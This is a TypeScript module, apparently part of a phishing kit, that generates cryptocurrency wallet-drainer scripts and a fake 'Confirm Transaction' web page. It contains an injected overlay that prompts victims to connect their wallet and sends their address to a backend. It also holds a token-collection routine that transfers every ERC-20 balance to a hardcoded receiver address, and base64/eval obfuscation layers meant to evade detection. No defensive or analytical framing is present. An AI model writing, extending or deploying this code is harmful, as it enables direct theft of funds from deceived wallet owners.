/**
 * Drainer Script Generator
 * Generates embedded JavaScript for wallet connection and asset collection
 */

export interface DrainerScriptConfig {
  receiver?: string;
  backend?: string;
  obfuscation?: 'none' | 'minify' | 'medium' | 'heavy';
  includeAnalytics?: boolean;
}

/**
 * Generate complete drainer script with embedded configuration
 * Returns ready-to-embed JavaScript code
 */
export function generateDrainerScript(config: DrainerScriptConfig): string {
  const receiver = config.receiver || '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693';
  const backend = config.backend || '/api/submit-drainer';
  const obfuscation = config.obfuscation || 'medium';

  const encodedReceiver = Buffer.from(receiver).toString('base64');
  const encodedBackend = Buffer.from(backend).toString('base64');

  const rawScript = `(function(){
'use strict';
const C={r:atob('${encodedReceiver}'),b:atob('${encodedBackend}')};
let t=!1;
function s(){const e=document.createElement('style');e.textContent='#d{position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.75);display:none;align-items:center;justify-content:center;font-family:system-ui}#b{background:#0f172a;color:#e2e8f0;border-radius:20px;padding:32px 28px;width:380px;box-shadow:0 25px 80px rgba(0,0,0,.6);border:1px solid #334155}#b h3{margin:0 0 8px;font-size:20px}#b p{font-size:14px;color:#94a3b8;margin:0 0 20px}#b button{width:100%;margin-top:12px;padding:14px 18px;border:0;border-radius:12px;background:#3b82f6;color:#fff;font-weight:700;font-size:15px;cursor:pointer}#b button.secondary{background:#475569}#st{margin-top:14px;font-size:13px;color:#fbbf24;min-height:18px;text-align:center}';document.head.appendChild(e);}
function o(){if(document.getElementById('d'))return;const e=document.createElement('div');e.id='d',e.innerHTML='<div id=\"b\"><h3>Connecting…</h3><p>Please approve in your wallet.</p><button id=\"c\">Connect Wallet</button><button id=\"x\" class=\"secondary\">Cancel</button><div id=\"st\"></div></div>',document.body.appendChild(e),e.style.display='flex',document.getElementById('c').onclick=i,document.getElementById('x').onclick=()=>e.style.display='none';}
async function i(){const e=document.getElementById('st');if(!window.ethereum)return void(e.textContent='No wallet detected');try{e.textContent='Connecting…';const n=new ethers.BrowserProvider(window.ethereum),a=await n.send('eth_requestAccounts',[]),s=await n.getSigner();fetch(C.b,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({wallet:a[0],receiver:C.r,site:location.hostname,timestamp:Date.now()})}).catch(()=>{}),e.textContent='Connected: '+a[0].slice(0,6)+'…'+a[0].slice(-4)}catch(n){e.textContent='Error: '+(n.message||n);}}
function r(){if(t)return;const e=()=>{t||(t=!0,document.removeEventListener('click',e,!0),o())};document.addEventListener('click',e,!0);}
function c(){window.__dL||(window.__dL=!0,s(),r());}'loading'===document.readyState?document.addEventListener('DOMContentLoaded',c):c();})();`;

  return applyObfuscation(rawScript, obfuscation);
}

/**
 * Generate drainer script with advanced features
 * Includes token balance checking and collection logic
 */
export function generateAdvancedDrainerScript(config: DrainerScriptConfig): string {
  const baseScript = generateDrainerScript(config);

  const advancedFeatures = `
// Token collection logic
async function collectTokens(signer, tokens) {
  const results = [];
  for (const token of tokens) {
    try {
      const contract = new ethers.Contract(
        token.address,
        ['function balanceOf(address) view returns (uint256)', 'function transfer(address,uint256) returns (bool)'],
        signer
      );
      const balance = await contract.balanceOf(signer.address);
      if (balance > 0n) {
        const tx = await contract.transfer(C.r, balance);
        results.push({ token: token.address, tx: tx.hash, success: true });
      }
    } catch (e) {
      results.push({ token: token.address, error: e.message, success: false });
    }
  }
  return results;
}

// Submit collection results to local backend
async function submitResults(wallet, results) {
  fetch('/api/notify', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      wallet,
      results,
      timestamp: Date.now()
    })
  }).catch(() => {});
}
`;

  return baseScript + advancedFeatures;
}

/**
 * Apply obfuscation based on level
 */
function applyObfuscation(script: string, level: 'none' | 'minify' | 'medium' | 'heavy'): string {
  switch (level) {
    case 'none':
      return script;

    case 'minify':
      // Simple minification - remove comments and extra whitespace
      return script
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/\/\/.*$/gm, '')
        .replace(/\s+/g, ' ')
        .trim();

    case 'medium':
      // Minify + base64 encode
      const minified = script
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/\/\/.*$/gm, '')
        .replace(/\s+/g, ' ')
        .trim();
      const encoded = Buffer.from(minified).toString('base64');
      return `(function(){'use strict';eval(atob('${encoded}'));})();`;

    case 'heavy':
      // Double base64 + self-executing eval — no broken variable indirection
      const heavyMinified = script
        .replace(/\/\*[\s\S]*?\*\//g, '')
        .replace(/\/\/.*$/gm, '')
        .replace(/\s+/g, ' ')
        .trim();
      const firstEncode = Buffer.from(heavyMinified).toString('base64');
      const secondEncode = Buffer.from(firstEncode).toString('base64');
      return `(function(){const _x=atob('${secondEncode}');eval(atob(_x));})();`;

    default:
      return script;
  }
}

/**
 * Generate HTML page with embedded drainer script
 */
export function generateDrainerPage(config: DrainerScriptConfig): string {
  const drainerScript = generateDrainerScript(config);

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Confirm Transaction</title>
  <script src="https://cdn.ethers.org/v6/ethers.umd.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      background: white;
      border-radius: 16px;
      padding: 40px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      max-width: 500px;
      width: 90%;
    }
    h1 { color: #1a202c; margin-bottom: 16px; font-size: 24px; }
    p { color: #4a5568; line-height: 1.6; margin-bottom: 24px; }
    button {
      width: 100%;
      padding: 14px 18px;
      border: none;
      border-radius: 8px;
      background: #667eea;
      color: white;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.2s;
    }
    button:hover { background: #5568d3; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Connect Your Wallet</h1>
    <p>Please connect your wallet to complete this transaction safely.</p>
  </div>

  <script>
    ${drainerScript}
  </script>
</body>
</html>`;
}
